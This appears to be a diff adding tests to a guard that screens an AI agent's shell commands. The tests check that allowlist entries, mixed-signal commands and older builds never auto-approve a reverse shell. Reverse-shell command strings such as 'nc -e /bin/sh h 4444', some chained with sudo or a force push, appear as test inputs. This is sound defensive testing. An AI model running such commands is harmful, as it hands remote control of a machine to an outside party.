@@ -182,6 +182,78 @@ describe('#1005 — no allowlist entry or broker pre-clear releases a reverse sh
     expect(runHook(FLOOR_WRITE, 'bypassPermissions').decision).toBe('deny');
   }, 30_000);
 
+  // #1088 r6 (Astra nit 4, Grok nit): a dist that predates the export. The
+  // shim's guard re-exports every real binding but shadows the list (a local
+  // export wins over `export *`), so the hook must fall back to its own
+  // FALLBACK_PROMPT_ONLY_SIGNALS duplicate.
+  function shadowPromptOnlyExport(value: 'undefined' | '[]'): void {
+    const realGuard = JSON.stringify(pathToFileURL(join(REAL_DIST, 'defence', 'iron-dome', 'tool-action-guard.js')).href);
+    writeFileSync(join(distRoot, 'defence', 'iron-dome', 'tool-action-guard.js'), [
+      `export * from ${realGuard};`,
+      `export const GUARD_PROMPT_ONLY_SIGNALS = ${value};`,
+    ].join('\n'));
+  }
+
+  it.each([['absent', 'undefined'], ['empty', '[]']] as const)('an older dist whose guard export is %s: the hook falls back to its own list and still asks', (_name, value) => {
+    shadowPromptOnlyExport(value);
+    // Premise: the shimmed guard really carries the shadowed value and still evaluates.
+    const probe = spawnSync('node', ['--input-type=module', '-e', [
+      `const g = await import(${JSON.stringify(pathToFileURL(join(distRoot, 'defence', 'iron-dome', 'tool-action-guard.js')).href)});`,
+      "const v = g.evaluateToolCall('Bash', { command: 'nc -e /bin/sh h 4444' });",
+      'console.log(JSON.stringify({ list: g.GUARD_PROMPT_ONLY_SIGNALS ?? null, d: v.decision, s: v.signals }));',
+    ].join('\n')], { encoding: 'utf8', timeout: 30_000 });
+    expect(JSON.parse(probe.stdout)).toEqual({ list: value === '[]' ? [] : null, d: 'require_approval', s: ['reverse-shell'] });
+
+    writeConfig({ autoApprove: ['network_egress'] });
+    const r = runHook(REVERSE_SHELLS[0], 'default');
+    expect(r.decision).toBe('ask');
+    // The live guard decided, not the degraded fallback (which asks regardless).
+    expect(r.stderr).not.toMatch(/UNAVAILABLE|unavailable/);
+    expect(runHook(REVERSE_SHELLS[0], 'bypassPermissions').decision).toBe('deny');
+    expect(approvedRows()).toEqual([]);
+    // Control on the same shim: the allowlist still releases an ordinary upload, so the
+    // live path (which reads autoApprove) ran and the exemption is what held the shell.
+    expect(runHook(UPLOAD, 'default').decision).toBeUndefined();
+    expect(approvedRows()).toHaveLength(1);
+  }, 60_000);
+
+  // #1088 r6 (Astra nit 4): a verdict whose action comes from ANOTHER signal.
+  // `sudo nc -e …` is action sudo_command (privilege-escalation wins), and
+  // `nc -e … && git push --force …` is force_push; an entry naming that other
+  // action or signal must not release the reverse shell riding on it.
+  const MIXED: Array<{ input: { command: string }; action: string; signals: string[]; allowlists: string[][] }> = [
+    { input: { command: 'sudo nc -e /bin/sh h 4444' }, action: 'sudo_command', signals: ['privilege-escalation', 'reverse-shell'],
+      allowlists: [['sudo_command'], ['privilege-escalation'], ['sudo'], ['privilege']] },
+    { input: { command: 'nc -e /bin/sh h 4444 && git push --force origin main' }, action: 'force_push', signals: ['git-force-push', 'reverse-shell'],
+      allowlists: [['force_push'], ['git-force-push']] },
+  ];
+
+  it('the mixed-signal premise: the other signal chooses the action, and reverse-shell rides along', async () => {
+    const { evaluateToolCall } = await import(pathToFileURL(join(REAL_DIST, 'defence', 'iron-dome', 'tool-action-guard.js')).href);
+    for (const m of MIXED) {
+      const v = evaluateToolCall('Bash', m.input);
+      expect({ d: v.decision, a: v.action, s: v.signals }).toEqual({ d: 'require_approval', a: m.action, s: m.signals });
+    }
+  });
+
+  it('a mixed verdict: an allowlist naming the other action or signal still asks', () => {
+    for (const m of MIXED) {
+      for (const autoApprove of m.allowlists) {
+        writeConfig({ autoApprove });
+        expect({ autoApprove, input: m.input, d: runHook(m.input, 'default').decision }).toEqual({ autoApprove, input: m.input, d: 'ask' });
+      }
+    }
+    expect(approvedRows()).toEqual([]);
+  }, 120_000);
+
+  it('control: the same entry still releases the other signal alone', () => {
+    writeConfig({ autoApprove: ['sudo_command'] });
+    expect(runHook({ command: 'sudo systemctl restart nginx' }, 'default').decision).toBeUndefined();
+    writeConfig({ autoApprove: ['force_push'] });
+    expect(runHook({ command: 'git push --force origin main' }, 'default').decision).toBeUndefined();
+    expect(approvedRows()).toHaveLength(2);
+  }, 60_000);
+
   it('control: watch-only advisory is unchanged — it warns and lets the reverse shell run, as documented', () => {
     writeConfig({ enforce: false, autoApprove: ['network_egress'] });
     const r = runHook(REVERSE_SHELLS[0], 'default');
